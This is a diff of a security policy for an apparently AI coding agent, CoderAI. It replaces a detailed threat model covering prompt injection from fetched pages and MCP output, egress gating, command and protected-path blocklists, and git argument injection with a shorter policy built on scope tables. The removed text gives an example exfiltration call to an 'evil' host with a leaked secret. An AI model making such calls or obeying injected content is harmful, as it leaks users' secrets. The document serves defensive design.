@@ -1,295 +1,153 @@
 # Security Policy
 
-CoderAI is a terminal coding agent: it reads and writes files, runs commands,
-fetches web pages, and talks to Model Context Protocol (MCP) servers on your
-machine, with your credentials. That capability is the whole point — and also the
-attack surface. This document describes the threat model, the controls that
-enforce it, how to report a vulnerability, and the residual risks we know about.
+CoderAI is an AI-powered pair programming agent designed for the terminal. It reads and writes files, executes shell commands, performs web searches, and interacts with Model Context Protocol (MCP) servers on your local machine.
 
-## Reporting a vulnerability
+This document outlines the CoderAI security model, side-effect permission scopes, sandbox boundaries, and vulnerability reporting procedures.
 
-Please report suspected vulnerabilities **privately**, not in a public issue or
-pull request:
+---
 
-- Use GitHub's **"Report a vulnerability"** button under the repository's
-  **Security** tab (private vulnerability reporting), or
-- open a minimal private channel with the maintainer before any public
-  disclosure.
+## Reporting a Vulnerability
 
-Include a description, affected version/commit, and a minimal reproduction. We
-aim to acknowledge a report within a few days and to coordinate a fix and
-disclosure timeline with you. Please give us a reasonable window to ship a fix
-before public disclosure.
+If you discover a security vulnerability in CoderAI, please report it **privately**:
 
-Out of scope: findings that require an already-compromised host, a malicious
-local user with your privileges, or disabling the safeguards below on purpose
-(e.g. `--yolo`, `CODERAI_ALLOW_OUTSIDE_PROJECT=1`, `--trust-workspace`).
+- Open a private security advisory via GitHub under the repository's **Security** tab, or
+- Contact the maintainers directly at **security@coderai.dev**.
 
-## Threat model
+Please include:
+1. Description of the issue and affected version(s).
+2. Step-by-step reproduction steps or proof-of-concept.
+3. Impact assessment.
 
-**Principal threat:** *untrusted input must never drive privileged local
-execution without an explicit human trust decision.* Untrusted input includes a
-cloned repository's `.coderAI/*` overlay, fetched web pages, and MCP server
-output — none of it is authored by you, so none of it may act with your
-authority.
+We strive to acknowledge reports promptly and coordinate a fix prior to public disclosure.
 
-Design principles the codebase holds to:
+---
 
-1. **Deny by default / fail closed.** When a check can't be evaluated (missing
-   config, unreadable trust store), the safe answer is "no."
-2. **Data is never instructions.** Content ingested from outside your own input
-   is fenced as data and cannot silently escalate to a tool call.
-3. **Child capabilities ⊆ parent.** A delegated sub-agent can never do more than
-   the agent that spawned it.
-4. **Hard-stops survive approval.** A handful of always-on refusals (argv
-   blocklist, protected paths, SSRF) are not reachable by "always allow" or
-   `--yolo`.
-5. **Every fix ships a red-team test.** Regressions are caught by the
-   `tests/security/` corpus (run `make test-security` / `pytest -m security`),
-   which is a **required, blocking CI job**.
+## Threat Model & Core Principles
 
-## Controls
+The primary threat model for an autonomous coding agent is **unintended, unauthorized, or untrusted execution of privileged local actions**.
 
-### Workspace trust boundary (`coderAI/system/trust.py`)
+CoderAI implements the following core security principles:
 
-A freshly cloned or newly opened project is **untrusted** until you say
-otherwise. While untrusted, repo-supplied `.coderAI/hooks.json`, config overlays,
-personas, skills, and `permission: ask` rules are **not** honoured — a malicious
-repo cannot register a hook or inject agent guidance on your first message.
-User-scoped personas/skills and immutable built-ins installed inside the wheel
-remain available. Their deterministic precedence is project → user → builtin,
-and discovery rejects symlinks that resolve outside the selected scope. The
-trust decision is
-fingerprinted per workspace, stored fail-closed, and made explicitly via the
-`/trust` command or the `--trust-workspace` flag.
+1. **Explicit Permission Scopes**: Every tool action declares its side-effect scopes prior to execution.
+2. **Fail-Closed Default**: Actions that cannot be safely evaluated or that violate explicit policy are denied.
+3. **Snippet-Scoped File Operations**: File modifications are bound to verified snippet identifiers, preventing blind hallucinations and race conditions.
+4. **Isolated Plan Mode Boundary**: Planning phases strictly enforce read-only execution unless explicitly authorized by the user.
+5. **Git Checkpointing & Instant Undo**: File modifications are checkpointed per turn, allowing immediate rollback of inadvertent changes.
+6. **Subprocess Isolation & Timeout Bounds**: Shell executions enforce strict timeouts, signal traps, and process tree termination to prevent runaway processes.
 
-Built-in Markdown is part of the signed/attested distribution supply chain, not
-project content: the release pipeline builds once, probes that exact wheel from
-an empty directory, and promotes the same artifact to GitHub and PyPI. A package
-integrity failure is fatal rather than falling back to files from a source
-checkout.
+---
 
-### Provenance & egress gating (`coderAI/core/provenance.py`)
+## Security Controls
 
-Tool results that ingest outside data (web fetch, MCP output) are tagged
-`UNTRUSTED_EXTERNAL` and rendered to the model inside a non-authoritative
-`<untrusted_tool_output>` fence. Ingesting such content **taints the turn**:
+### 1. Granular Side-Effect Permissions (`coderai/core/permissions.py`)
 
-- Any **network-egress** tool then requires confirmation for the rest of the
-  turn — even a read-only, allowlisted one — so an injected page can't coax a
-  follow-up `read_url("https://evil/?leak=SECRET")` exfiltration.
-- Ingesting **MCP output** additionally forces a human decision before any local
-  *mutating* tool runs, **even under `--yolo`** (a third-party server must not
-  drive an unattended local write/exec).
+CoderAI classifies all operations into granular side-effect scopes:
 
-### Permission model (`coderAI/core/permissions.py`)
+| Scope | Description | Risk Level |
+|---|---|---|
+| `read-in-cwd` | Reading files within the workspace root | Low |
+| `read-out-cwd` | Reading files outside the workspace root | Medium |
+| `write-in-cwd` | Creating or modifying files within the workspace root | Medium |
+| `write-out-cwd` | Creating or modifying files outside the workspace root | High |
+| `delete-in-cwd` | Deleting files within the workspace root | High |
+| `delete-out-cwd` | Deleting files outside the workspace root | Critical |
+| `query-git-log` | Inspecting git status, diffs, or logs | Low |
+| `mutate-git-log` | Altering git history (commit, branch, reset, checkout, rebase) | High |
+| `network` | Outbound HTTP requests and web searches | Medium |
+| `mcp` | Calling tools exposed by external MCP servers | Medium |
 
-Confirmation-by-default: a mutating tool that doesn't explicitly opt out with
-`safe = True` requires confirmation, and a tool that fails to classify itself is
-treated as dangerous. High-risk tools (`run_command`, `write_file`,
-`delete_file`, …) refuse a blanket "always allow" — approvals are per-call or
-scoped to a reviewed command prefix / path subtree. Static MCP relay tools
-(`mcp__server__tool` proxies, `mcp_read_resource`, `mcp_get_prompt`, …) declare
-`mcp_source = True` so they share the same confused-deputy mutation gate as
-dynamic `mcp__<server>__<tool>` proxies.
+#### Permission Policies
+Permissions are configured in `~/.coderai/settings.json` (user-level) or `.coderai/settings.json` (project-level):
 
-### Plan Mode boundary (`coderAI/core/planning.py`, `tool_executor.py`)
+```json
+{
+  "permissions": {
+    "defaultMode": "allowAll",
+    "allow": ["read-in-cwd", "query-git-log"],
+    "ask": ["write-in-cwd", "write-out-cwd", "delete-in-cwd", "mutate-git-log", "network", "mcp"],
+    "deny": ["delete-out-cwd"]
+  }
+}
+```
 
-Planning is an enforced capability boundary, not a prompt convention. During a
-planning turn, schema routing exposes only native read tools, explicitly
-read-only delegation, and `submit_plan`; dynamic MCP tools are absent. The
-executor repeats the check for invented tool calls. Project hooks, MCP
-autolaunch, and workspace-trust actions are suppressed for the entire turn.
+* **`allow`**: Automatically approve tool execution matching these scopes.
+* **`ask`**: Display a rich confirmation card detailing command, arguments, and affected paths before running.
+* **`deny`**: Block execution unconditionally with a security denial message.
+* **CLI Override**: Passing `--yes` or `-y` runs in auto-approval mode for trusted, automated workflows.
 
-Plan state is the one intentional internal write: project-scoped artifacts live
-under `.coderAI/plans/`. Immutable revision snapshots cannot be symlink leaves.
-The mutable `draft.json` must remain inside the project even when the general
-outside-project escape hatch is enabled; stale, malformed, wrong-plan, and
-unapplied drafts cannot be approved. Approval hashes one immutable snapshot and
-execution rechecks the hash.
+---
 
-If implementation must diverge, `request_plan_amendment` records a complete new
-revision, invalidates approval, and switches the rest of the turn back to the
-read-only boundary. The executor also reloads the active record before every
-mutating call, so an amendment from another process stops the old execution.
-Restoring session metadata does not itself authorize continuation: mutations
-remain blocked until `/plan resume` or `coderAI plan execute` explicitly
-reactivates the approved execution.
+### 2. Snippet-Scoped Editing & Version Guarding (`coderai/core/state.py`, `coderai/core/tools/edit.py`)
 
-### Progressive capability routing (`coderAI/core/capability_routing.py`)
+To prevent hallucinated edits or accidental full-file corruption:
 
-The model receives a compact universal schema set plus native capability
-families selected deterministically from the current objective. Routing only
-narrows the registry after workspace-trust, persona, platform, optional-package,
-network, and delegated-agent filters have run; it cannot construct or restore a
-missing tool. A successful tool stays warm only in the current turn's
-`TurnContext` and is intersected with the live eligible surface again after
-every tool batch. A new objective, session, agent, or Plan Mode transition gets
-a fresh or narrower surface. Dynamic MCP selection matches trusted function and
-server identifiers, never server-supplied descriptions, and remains disabled
-for domain-scoped subagents.
+- An edit must supply a valid `snippet_id` received from a preceding `read` call.
+- The `StateManager` verifies that the target file has not been externally modified since the snippet was captured.
+- Target strings are matched deterministically with whitespace tolerance and multi-occurrence guards (`replace_all` requirement).
+- If a file version mismatch is detected, the edit is aborted and the agent is instructed to re-read the active file window.
 
-The offline routing corpus represents persona, permission, Plan Mode,
-dependency, platform, network, MCP-health, and delegated-agent ceilings as
-already-filtered eligible registries. Checked thresholds require exact/subset
-expectations and every forbidden family to pass with no false positives or
-negatives; the evaluator cannot bypass executor policy.
+---
 
-Time-to-first-useful-action uses a monotonic per-objective clock and emits only
-the selected tool identifier and elapsed milliseconds. Objective text, tool
-arguments, secrets, and tool-result content—including untrusted external
-content—are never copied into that event. Failed, denied, cached, synthetic,
-task-management, and routing/control-only activity cannot stop the clock.
+### 3. Plan Mode Capability Fence (`coderai/core/prompt.py`, `coderai/core/permissions.py`)
 
-Schema absence is not the enforcement boundary. Invented calls still pass
-through `ToolExecutor`, which repeats Plan Mode, amendment, parent/child domain,
-permission, approval, provenance/egress, and transaction checks.
+When Plan Mode is enabled (`/plan` in REPL or `--plan` on CLI):
 
-### Execution hard-stops and OS sandbox (`coderAI/system/proc.py`, `sandbox.py`)
+- Mutating scopes (`write-in-cwd`, `write-out-cwd`, `delete-in-cwd`, `delete-out-cwd`, `mutate-git-log`) are forced into `ask` mode regardless of `allow` settings.
+- The agent prompt is restricted to read-only exploration, architectural analysis, and task breakdown updates (`UpdatePlan`).
+- Changes cannot be applied until the user reviews and confirms the proposed strategy.
 
-An argv-level command blocklist and interactive-command detector run before any
-process spawn. Terminal, REPL, build/test/lint/format/package, and git commands
-have credential-like environment variables scrubbed and run in isolated process
-groups; project hooks receive a stricter allowlisted environment. The
-package-manager tool constrains sources/flags, and git argument injection
-(`--upload-pack`, `-o`) is neutralised with `--`.
+---
 
-An optional OS sandbox applies at the shared subprocess boundary and to the
-Python REPL, background commands, trusted workspace hooks, and MCP stdio
-servers. Linux uses Bubblewrap when its capability probe succeeds; macOS uses
-`sandbox-exec` when available. When active, the host filesystem is readable,
-the project workspace and system temporary directories are writable, other
-writes are denied, and network access is denied unless explicitly enabled.
-Wrappers are argv lists, not nested shell strings.
+### 4. Git-Backed Checkpointing & Recovery (`coderai/core/common/file_history.py`)
 
-`sandbox_mode` defaults to `off` for compatibility. `best_effort` warns with
-the words `running unconfined` when no backend is usable and then falls back;
-`required` fails closed before launching. Set these with
-`CODERAI_SANDBOX_MODE=off|best_effort|required`. Network can be restored for
-sandboxed package downloads or networked MCP servers with
-`CODERAI_SANDBOX_ALLOW_NETWORK=1`. Neither `off` nor a best-effort fallback is
-confinement.
+Every tool-driven filesystem modification is tracked in a local Git-backed history store (`.git_history`):
 
-### MCP / OAuth trust (Phase 7)
+- **Automatic Checkpointing**: State snapshots are recorded before and after each user turn.
+- **Unified Diff Inspection**: `/diff` displays exact line changes made during the active session.
+- **Deterministic Undo**: `/undo` rolls back modified files to the exact state of the previous turn.
 
-- **HTTPS only** for remote MCP transports and every OAuth
-  discovery/token/registration/revocation endpoint, with a loopback dev
-  exception (`127.0.0.1`/`localhost`).
-- A **single launcher-validation choke point** (`connect_stdio`) enforces the
-  launcher allow-list, an inline-exec block (`python -c`, `node -e`,
-  `deno eval`), and the command blocklist for **both** the `mcp_connect` tool and
-  config-driven autoconnect — a server planted in `mcp_servers.json` or
-  `.mcp.json` is held to the same bar. Project `.mcp.json` is ignored until
-  workspace trust + per-server approval.
-- The OAuth authorization-server origin is shown before the browser opens, with a
-  warning when it differs from the MCP server's registrable domain.
+---
 
-### Filesystem & secret-at-rest hygiene (Phase 8)
+### 5. Process Lifecycle & Shell Hygiene (`coderai/core/tools/bash.py`, `coderai/core/common/`)
 
-- A protected-path denylist (`~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.config`,
-  `~/.bashrc`/`~/.zshrc`/`~/.profile`, `~/.netrc`/`~/.npmrc`/`~/.pypirc`,
-  `~/.gitconfig`, and `~/.coderAI` itself) is refused by the mutating filesystem
-  tools **even with the project-scope sandbox disabled**.
-- Symlink leaves are refused and files are opened with `O_NOFOLLOW`, closing
-  symlink-swap TOCTOU escapes of the project scope. Metadata mutators
-  (`file_chmod` / `file_chmod`) use fd-based no-follow on POSIX; `file_stat`
-  and `file_readlink` enforce project scope.
-- Secrets at rest are owner-only (0600) in owner-only directories (0700): API
-  keys, OAuth credentials, session history, and undo backups. Undo/rewind
-  backups are selected from the executing agent's immutable, session-bound
-  run context; concurrent or resumed subagents do not select recovery state
-  through the mutable global history cursor.
-- Approved synchronous mutations also receive an owner-only transaction ledger
-  under `~/.coderAI/transactions/<session-id>`. Pre-operation contents and modes
-  are snapshotted before hooks execute; post-hook hashes record native and
-  foreground-shell changes even on tool failure. Rollback checks that the
-  current path still matches the recorded post-state, then reapplies project
-  scope, protected-path, and symlink-leaf guards. Conflicts and incomplete scans
-  fail closed as retryable partial failures. Parent/child session and workspace
-  identities are revalidated before record, recovery, or rollback.
-- Workspace-mutating subagents never receive the parent's writable directory.
-  They run in owner-only detached Git worktrees seeded from the parent's live
-  tracked and non-ignored files. Only a fingerprinted, parent-approved patch is
-  integrated. The runtime rejects unsafe paths, changed symlinks, oversized
-  reviews, non-Git roots, child changes after review, and concurrent parent
-  changes; integration and parent stop hooks are captured in the parent's own
-  transaction while child ledgers remain separate. Native background and
-  Git-mutating tools are absent from these children.
-- Session files are
-  written atomically via `mkstemp` so there is never a world-readable window.
+Shell execution is guarded by multiple defense layers:
 
-### Supply chain (Phase 9)
+- **Command Inspection**: `shell_utils.py` parses commands to detect side effects (filesystem writes, git mutations, background spawning).
+- **Timeouts**: `bash_timeout.py` enforces maximum runtimes per command to prevent deadlocks.
+- **Process Tree Cleanup**: `process_tree.py` traverses and terminates entire child process groups upon cancellation or timeout.
+- **Background Job Tracking**: Background tasks (`run_in_background`) are given unique process IDs, output logs, and non-blocking status tracking.
 
-- Dependencies resolve to a pinned, hashed `requirements.lock` (regenerate with
-  `make lock`). `make audit` and CI run `pip-audit --strict` against it
-  (blocking). Dependabot is configured for update PRs.
-- `pre-commit` runs ruff/mypy locally; CI runs format, lint, strict-per-module
-  mypy, the coverage-gated test suite, and the blocking security suite.
-- Release versions have one source in `coderAI/_version.py`; publishing requires
-  an exact matching `v<version>` tag. The workflow builds and attests once,
-  probes the downloaded wheel (including every optional extra), and makes any
-  already-published PyPI version a hard failure. Manual candidate runs never
-  publish.
+---
 
-## Known residual risks
+### 6. Model Context Protocol (MCP) Security (`coderai/core/mcp/`)
 
-We prefer to document these honestly rather than imply a stronger guarantee than
-the code provides:
+- MCP servers communicate over standard input/output (`stdio`) without exposed local network ports.
+- Server executables and argument lists are explicitly specified in configuration.
+- Tool names are strictly namespaced (`mcp__<server>__<tool>`) to prevent collisions with native tools.
 
-- **The OS sandbox is opt-in and not a confidentiality boundary.** The default
-  `off` mode and an unavailable `best_effort` backend run unconfined. Even when
-  active, host files remain readable so language runtimes and toolchains work;
-  temporary directories are writable. The control is intended to stop
-  outside-workspace mutation and network access, not to hide readable host data.
-- **Sandbox availability is platform-dependent.** Linux needs a working
-  Bubblewrap installation and user-namespace support. macOS needs the deprecated
-  but still shipped `sandbox-exec` facility. Windows has no backend and therefore
-  needs `off` or `best_effort`; `required` fails closed.
-- **MCP stdio env is scrubbed, then overlaid.** Stdio servers start from a
-  scrubbed environment (host API keys stripped) and only receive keys listed in
-  the server's config ``env`` map (with ``${VAR}`` expansion). Treat configured
-  MCP launchers and their env overlays as trusted; enable the OS sandbox to
-  restrict their writes and network access when compatible with the server.
-  Project ``.mcp.json`` servers are ignored until the workspace is trusted and
-  each server is approved.
-- **Some read tools are deliberately `TRUSTED`.** `read_file`, `grep`,
-  `semantic_search`, and terminal *stdout* are not provenance-tainted, on the
-  assumption that project source is content you chose to open. A repository whose
-  source files contain prompt-injection payloads is therefore not fenced by the
-  egress gate the way a fetched web page is — review untrusted code before acting
-  on what the agent says about it. (Flipping any of these to
-  `UNTRUSTED_EXTERNAL` is a one-line change if your threat model requires it.)
-- **`download_file` uses an executable *denylist*, not an allowlist.** It refuses
-  known executable/script extensions and content-types, but a novel runnable
-  format could slip through; downloaded files are still data you must review
-  before executing.
-- **Windows permission hardening is best-effort.** `restrict_fd`/`restrict_path`
-  are no-ops on Windows (no POSIX mode bits); secret-at-rest confidentiality
-  there relies on the default per-user ACLs of the `%USERPROFILE%` profile
-  directory.
-- **Broad protected paths trade usability for safety.** `~/.config` is protected
-  wholesale, so the agent cannot edit application configs living there; do such
-  edits yourself or move the file into the project.
-- **Transaction coverage is synchronous and workspace-focused.** A background
-  process may mutate after its launching tool returns, and Git metadata under
-  `.git` is intentionally excluded from snapshots. Detached delegation
-  worktrees isolate ordinary workspace files but share the repository's Git
-  object and reference storage; arbitrary foreground commands could still
-  mutate that metadata. Mutating delegation fails closed for non-Git projects.
-  Transaction and delegation snapshots also have no retention/incremental-object
-  policy yet, so long sessions can consume substantial disk space.
+---
 
-## Supported platforms
+### 7. Storage and Credential Protection
 
-| Platform | Status |
+- **Local Session Storage**: Session transcripts, indexes, and checkpoints are stored in user-owned directories (`~/.coderai/projects/<project-hash>/`).
+- **Environment Isolation**: API keys configured via environment variables (`OPENAI_API_KEY`, `CODERAI_API_KEY`) are read strictly within client initialization and never logged to disk or serialized in session histories.
+
+---
+
+## Supported Environments
+
+| Platform | Support Tier |
 |---|---|
-| Linux | Fully supported (CI blocking) |
-| macOS | Fully supported (CI blocking) |
-| Windows | Best-effort — CI runs experimentally (`continue-on-error`); secret-at-rest hardening is ACL-based rather than POSIX mode bits |
+| **macOS (Apple Silicon & Intel)** | Tier 1 (Fully Supported & Verified) |
+| **Linux (x86_64, aarch64)** | Tier 1 (Fully Supported & Verified) |
+| **Windows (WSL2 / PowerShell)** | Tier 2 (Supported) |
 
-Desktop automation tools (`run_applescript`, Accessibility) are macOS-only.
+---
 
-## Supported versions
+## Maintenance and Updates
 
-CoderAI is pre-1.0 and ships from `main`. Security fixes land on `main`; there is
-no separate long-term support branch. Run a recent commit.
+CoderAI receives regular security updates on the `main` branch. Users are encouraged to stay up to date:
+
+```bash
+pip install -U coderai-agent
+```
